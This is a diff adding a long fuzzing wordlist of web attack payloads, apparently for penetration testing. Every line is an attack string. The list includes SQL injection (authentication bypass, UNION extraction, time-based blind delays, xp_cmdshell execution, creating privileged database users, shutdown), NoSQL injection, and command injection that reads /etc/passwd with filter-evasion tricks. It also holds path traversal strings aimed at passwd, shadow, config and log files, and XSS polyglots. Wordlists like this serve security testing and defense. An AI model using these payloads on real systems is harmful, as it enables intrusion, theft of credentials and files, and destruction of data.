@@ -1,0 +1,3291 @@
+
+ waitfor delay '0:0:20' --
+ waitfor delay '0:0:20' /* 
+_config.php
+-
+--
+-- or #
+--';
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+--sp_password
+-1
+-1.0
+-2
+-20
+-268435455
+-c 10 127.0.0.1
+-c 10 google.com
+-id
+,
+, `id`
+, `id` #
+, $where: '1 == 1'
+, id
+,@variable
+,id
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+;
+; --
+; `id`
+; `id` #
+; id
+; ping 127.0.0.1 -c 4;
+;"
+;{cat,/etc/passwd}
+;/usr/bin/id;
+;/usr/bin/id\n
+;+$u+cat+/etc$u/passwd+\#
+;+$u+cat+/etc$u/passwd$u
+;+cat+/e'tc/pass'wd
+;|/usr/bin/id|
+;|id|
+;${@print(md5("whoami"))}
+;${@print(md5(whoami))}
+;cat /e${hahaha}tc/${heywaf}pas${catchthis}swd
+;cat%20/etc/passwd
+;cat+/etc/passwd
+;cat+/etc/passwd+#
+;cat</etc/passwd
+;cat$IFS/etc/passwd
+;cat$u /etc$u/passwd$u
+;cat$u+/etc$u/passwd$u
+;dir
+;echo 111111
+;echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
+;id
+;id;
+;id/n
+;id\n
+;id|
+;l"s${IFS}-la
+;ls -la
+;netstat -a;
+;phpinfo
+;phpinfo();
+;read;
+;sleep 3;.jpg
+;system('/usr/bin/id')
+;system('cat%20/etc/passwd')
+;system('id')
+;unam"e${IFS}-a
+;waitfor delay '00:02'
+;waitfor delay '00:02' -- 
+;waitfor delay \'00:02\'
+;waitfor delay \'00:02\' -- 
+:id
+:response.write 111111
+!
+!'
+!@#$%%^#$%#$@#$%$$@#$%^^**(()
+!@#0%^#0##018387@#0^^**(()
+!id
+!id!
+?x=
+?x="
+?x=>
+?x=|
+....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+....//....//....//....//....//....//....//....//....//....//etc/passwd
+....//....//....//....//....//....//....//....//....//etc/passwd
+....//....//....//....//....//....//....//....//etc/passwd
+....//....//....//....//....//....//....//etc/passwd
+....//....//....//....//....//....//etc/passwd
+....//....//....//....//....//etc/passwd
+....//....//....//....//etc/passwd
+....//....//....//etc/passwd
+....//....//etc/passwd
+....//etc/passwd
+....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd
+....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd
+....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd
+....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd
+....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd
+....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd
+....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd
+....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd
+....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd
+....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd
+....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd
+....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd
+....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd
+....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd
+....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd
+....\/....\/....\/....\/....\/....\/....\/etc/passwd
+....\/....\/....\/....\/....\/....\/etc/passwd
+....\/....\/....\/....\/....\/etc/passwd
+....\/....\/....\/....\/etc/passwd
+....\/....\/....\/etc/passwd
+....\/....\/etc/passwd
+....\/etc/passwd
+../
+../_config.php
+../_config.php%00
+../../../../../../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../../../../../../../../etc/shadow%00
+../../../../../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../boot.ini
+../../../../../../../../../../../../boot.ini%00
+../../../../../../../../../../../../etc/hosts
+../../../../../../../../../../../../etc/hosts%00
+../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../etc/shadow
+../../../../../../../../../../../../etc/shadow%00
+../../../../../../../../../../../../localstart.asp
+../../../../../../../../../../../../localstart.asp%00
+../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../etc/passwd
+../../../../../../../../../../etc/passwd%00
+../../../../../../../../../etc/passwd
+../../../../../../../../../etc/passwd%00
+../../../../../../../../conf/server.xml
+../../../../../../../../etc/passwd
+../../../../../../../../etc/passwd%00
+../../../../../../../../windows/win.ini
+../../../../../../../dev
+../../../../../../../etc/httpd/logs/acces_log
+../../../../../../../etc/httpd/logs/acces.log
+../../../../../../../etc/httpd/logs/error_log
+../../../../../../../etc/httpd/logs/error.log
+../../../../../../../etc/passwd
+../../../../../../../etc/passwd%00
+../../../../../../../usr/local/apache/logs/access_ log
+../../../../../../../usr/local/apache/logs/access. log
+../../../../../../../usr/local/apache/logs/error_l og
+../../../../../../../usr/local/apache/logs/error.l og
+../../../../../../../var/log/access_log
+../../../../../../../var/log/access.log
+../../../../../../../var/log/apache/access_log
+../../../../../../../var/log/apache/access.log
+../../../../../../../var/log/apache/error_log
+../../../../../../../var/log/apache/error.log
+../../../../../../../var/log/apache2/access_log
+../../../../../../../var/log/apache2/access.log
+../../../../../../../var/log/apache2/error_log
+../../../../../../../var/log/apache2/error.log
+../../../../../../../var/log/error_log
+../../../../../../../var/log/error.log
+../../../../../../../var/www/logs/access_log
+../../../../../../../var/www/logs/access.log
+../../../../../../../var/www/logs/error_log
+../../../../../../../var/www/logs/error.log
+../../../../../../etc/passwd
+../../../../../../etc/passwd&=%3C%3C%3C%3C
+../../../../../../etc/passwd%00
+../../../../../apache/logs/access.log
+../../../../../apache/logs/error.log
+../../../../../etc/httpd/logs/access_log
+../../../../../etc/httpd/logs/access.log
+../../../../../etc/httpd/logs/error_log
+../../../../../etc/httpd/logs/error.log
+../../../../../etc/passwd
+../../../../../etc/passwd%00
+../../../../../favicon.ico.jpg
+../../../../../logs/access.log
+../../../../../logs/error.log
+../../../../../usr/local/apache/logs/access_log
+../../../../../usr/local/apache/logs/access.log
+../../../../../usr/local/apache/logs/error_log
+../../../../../usr/local/apache/logs/error.log
+../../../../../var/log/access_log
+../../../../../var/log/apache/access_log
+../../../../../var/log/apache/access.log
+../../../../../var/log/apache/error_log
+../../../../../var/log/apache/error.log
+../../../../../var/log/error_log
+../../../../../var/log/httpd/access_log
+../../../../../var/log/httpd/error_log
+../../../../../var/www/logs/access.log
+../../../../../var/www/logs/error_log
+../../../../../var/www/logs/error.log
+../../../../apache/logs/access.log
+../../../../apache/logs/error.log
+../../../../etc/passwd
+../../../../etc/passwd%00
+../../../../logs/access.log
+../../../../logs/error.log
+../../../administrator/inbox
+../../../apache/logs/access.log
+../../../apache/logs/error.log
+../../../etc/passwd
+../../../etc/passwd%00
+../../../logs/access.log
+../../../logs/error.log
+../../apache/logs/access.log
+../../apache/logs/error.log
+../../boot.ini
+../../etc/passwd
+../../etc/passwd/logo.jpg
+../../etc/passwd%00
+../../logs/access.log
+../../logs/error.log
+../../windows/win.ini
+../.htpasswd
+../.pass
+../.passwd
+..//..//..//..//..//boot.ini
+../apache/logs/access.log
+../apache/logs/error.log
+../config.asp
+../config.inc.php
+../config.js
+../config.php
+../etc/passwd
+../etc/passwd%00
+../install.php
+../logs/access.log
+../logs/error.log
+../users.db.php
+../web.config
+..\
+..\../..\../..\../..\../boot.ini
+..\../..\../boot.ini
+..\..\..\..\..\..\..\..\..\..\boot.ini
+..\..\..\..\..\..\..\..\..\..\boot.ini%00
+..\..\..\..\..\..\..\..\..\..\etc\passwd
+..\..\..\..\..\..\..\..\..\..\etc\passwd%00
+..\..\..\..\..\..\..\..\..\..\etc\shadow
+..\..\..\..\..\..\..\..\..\..\etc\shadow%00
+..\..\..\..\..\..\..\..\windows\win.ini
+..\web.config
+..%%35%63
+..%%35c
+..%25%35%63
+..%255c
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow
+..%2F..%2F..%2F%2F..%2F..%2F%2Fvar%2Fnamed
+..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd
+..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow
+..%5c
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini
+..%bg%qf
+..%c0%af
+..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini
+..%ef%b9%a8..%ef%b9%a8..%ef%b9%a8..%ef%b9%a8..%ef%b9%a8..%ef%b9%a8boot.ini
+..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
+..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bcboot.ini
+..%u2215
+..%u2216
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fshadow%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2facces_log
+..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2facces.log
+..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2ferror_log
+..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2ferror.log
+..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2faccess_ log
+..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2faccess. log
+..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2ferror_l og
+..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2ferror.l og
+..2f..2f..2f..2f..2f..2f..2fvar2flog2faccess_log
+..2f..2f..2f..2f..2f..2f..2fvar2flog2faccess.log
+..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22faccess_log
+..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22faccess.log
+..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22ferror_log
+..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22ferror.log
+..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2faccess_log
+..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2faccess.log
+..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2ferror_log
+..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2ferror.log
+..2f..2f..2f..2f..2f..2f..2fvar2flog2ferror_log
+..2f..2f..2f..2f..2f..2f..2fvar2flog2ferror.log
+..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2faccess_log
+..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2faccess.log
+..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2ferror_log
+..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2ferror.log
+..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2fapache2flogs2faccess.log
+..2f..2f..2fapache2flogs2ferror.log
+..2f..2f..2fetc2fpasswd
+..2f..2f..2fetc2fpasswd%00
+..2f..2fapache2flogs2faccess.log
+..2f..2fapache2flogs2ferror.log
+..2f..2fetc2fpasswd
+..2f..2fetc2fpasswd%00
+..2fapache2flogs2faccess.log
+..2fapache2flogs2ferror.log
+..2fetc2fpasswd
+..2fetc2fpasswd%00
+.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd
+.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow
+.htpasswd
+.id
+.pass
+.passwd
+'
+' --
+' –
+' ;
+' ; drop table temp --
+' '
+' (select top 1
+' } ], $comment:'successful MongoDB injection'
+' && this.password.match(/.*/)//+%00
+' && this.passwordzz.match(/.*/)//+%00
+' #
+' `id`
+' `id` #
+' and 'one'='one
+' and 'one'='one–
+' and 1='1
+' AND 1=0 UNION ALL SELECT '', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220
+' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
+' and a='a
+' AND id IS NULL; --
+' and substring(password/text(),1,1)='7
+' exec sp_addsrvrolemember 'name' , 'sysadmin' --
+' grant connect to name; grant resource to name; --
+' group by password having 1=1--
+' group by userid having 1=1--
+' group by username having 1=1--
+' id
+' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --
+' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
+' or         0=0 #
+' or '' '
+' OR '' = '
+' or ''-'
+' or ''*'
+' or ''&'
+' or ''^'
+' or ''='
+' OR '1
+' or '1'='1
+' or '1'='1'--
+' or '1'='1'/*
+' or '1'='1'#
+' or '1′='1
+' or 'a'='a
+' or 'one'='one
+' or 'one'='one–
+' or 'x'='x
+' OR 'x'='x
+‘ or ‘x’='x
+' OR 'x'='x'#;
+' or "
+' or "a" or '
+' or (EXISTS)
+' or /* or '
+' or 0=0 --
+' or 0=0 –
+' or 0=0 #
+‘ or 0=0 #
+' OR 1 -- -
+' or 1 in (@@version)--
+' or 1 or '
+' or 1]%00
+' or 1=1
+' or 1=1 --
+' or 1=1 -- 
+' OR 1=1 --+
+' or 1=1 –
+‘ or 1=1 –
+' or 1=1 limit 1 -- -+
+' or 1=1 LIMIT 1;#
+' or 1=1 or ''='
+' or 1=1--
+' or 1=1-- -
+' or 1=1–
+‘ or 1=1–
+' or 1=1;#
+' or 1=1/*
+' or 1=1#
+' or a=a--
+' or a=a–
+‘ or a=a–
+' or true--
+' or true() or '
+' or uid like '%
+' or uname like '%
+' or user like '%
+' or userid like '%
+' or username like '%
+' union (select @@version) --
+' union (select NULL, (select @@version)) --
+' union (select NULL, NULL, (select @@version)) --
+' union (select NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
+' UNION ALL SELECT
+' UNION ALL SELECT 1, @@version;#
+' UNION ALL SELECT system_user(),user();#
+' UNION SELECT
+' UniON SElecT 1,2-- 2
+' UniON SElecT 1,2,3-- 2
+' UniON SElecT 1,2,3,4-- 2
+' UniON SElecT 1,2,3,4,5-- 2
+' UniON SElecT 1,2,3,4,5#
+' UnION SELeCT 1,2,3,4,5`
+' UniON SElecT 1,2,3,4#
+' UnION SELeCT 1,2,3,4`
+' UniON SElecT 1,2,3#
+' UnION SELeCT 1,2,3`
+' UniON SElecT 1,2#
+' UnION SELeCT 1,2`
+' UNION select table_schema,table_name FROM information_Schema.tables;#
+' waitfor delay '0:0:20' --
+' waitfor delay '0:0:20' /* 
+' waitfor delay '00:02' -- 
+'--
+'-- 2
+'-'
+'-''-- 2
+'-''/*
+'-''#
+'-confirm`1`-'.jpg
+', $or: [ {}, { 'a':'a
+', $where: '1 == 1'
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL)%20waifor%20delay%20'0:0:20'%20/*
+',NULL)%20waitfor%20delay%20'0:0:20'%20--
+'; --
+'; exec master..xp_cmdshell
+'; exec master..xp_cmdshell 'ping 10.10.1.2 -c 4'--
+'; exec xp_regread
+'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- 
+'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --
+'; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --
+'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --
+'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --
+'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --
+'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --
+'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --
+'; waitfor delay '0:30:0'--
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
+';shutdown--
+';waitfor delay '00:02' -- 
+''
+'';!--"<XSS>=&{()}
+'''''''''''''UNION SELECT '2
+''id
+''id''
+''id''&
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+')
+') or '1'='1
+') or '1'='1--
+') or '1'='1'--
+') or '1'='1'/*
+') or '1'='1'#
+') or ('1'='1
+') or ('1'='1--
+') or ('1'='1'--
+') or ('1'='1'/*
+') or ('1'='1'#
+') or ('a'='a
+‘) or (‘a’='a
+') or ('a'='a and hi") or ("a"="a
+') or ('x')=('x
+') or ('x'='x
+‘) or (‘x’='x
+') or 1=1-- -
+') or 1=1/*
+') or 1=1#
+') or true--
+') UniON SElecT 1,2-- 2
+') UniON SElecT 1,2,3-- 2
+') UniON SElecT 1,2,3,4-- 2
+') UniON SElecT 1,2,3,4,5-- 2
+') UniON SElecT 1,2,3,4,5#
+') UniON SElecT 1,2,3,4#
+') UniON SElecT 1,2,3#
+') UniON SElecT 1,2#
+') waitfor delay '0:0:20' --
+') waitfor delay '0:0:20' /* 
+')-- 2
+')-''-- 2
+')-''/*
+')-''#
+')-('
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL)%20waifor%20delay%20'0:0:20'%20/*
+'),NULL)%20waitfor%20delay%20'0:0:20'%20--
+'); --
+')) or (('x'))=(('x
+')) waitfor delay '0:0:20' --
+')) waitfor delay '0:0:20' /* 
+'))) waitfor delay '0:0:20' --
+'))) waitfor delay '0:0:20' /* 
+')))) waitfor delay '0:0:20' --
+')))) waitfor delay '0:0:20' /* 
+'))))) waitfor delay '0:0:20' --
+'))))) waitfor delay '0:0:20' /* 
+')))))) waitfor delay '0:0:20' --
+')))))) waitfor delay '0:0:20' /* 
+'))%20waitfor%20delay%20'0:0:20'%20--
+'))%20waitfor%20delay%20'0:0:20'%20/*
+')*''-- 2
+')*''/*
+')*''#
+')*('
+')/*
+')&''-- 2
+')&''/*
+')&''#
+')&('
+')#
+')%20waitfor%20delay%20'0:0:20'%20--
+')%20waitfor%20delay%20'0:0:20'%20/*
+')^''-- 2
+')^''/*
+')^''#
+')^('
+')=''-- 2
+')=''/*
+')=''#
+')=('
+')||'2'='2'||('
+')||'2'=('2
+')||'2'||('
+')||'2'LiKE'2'-- 2
+')||'2'LiKE'2'/*
+')||'2'LiKE'2'#
+')||'2'LiKE'2'||('
+')||'2'LiKE('2
+')||('2
+')||(2)LiKE(2)-- 2
+')||(2)LiKE(2)/*
+')||(2)LiKE(2)#
+')||(2)LiKE(2)||('
+')||2-- 2
+')||2/*
+')||2#
+')||2=(2)LimIT(1)-- 2
+')||2=(2)LimIT(1)/*
+')||2=(2)LimIT(1)#
+')||2=2-- 2
+')||2=2/*
+')||2=2#
+')||2=2||('
+')||2||('
+')||true-- 2
+')||true/*
+')||true#
+')||true||('
+')oR 2 oR('
+')oR 2-- 2
+')oR 2/*
+')oR 2#
+')oR 2=2 oR('
+')oR 2=2-- 2
+')oR 2=2/*
+')oR 2=2#
+')oR true oR('
+')oR true-- 2
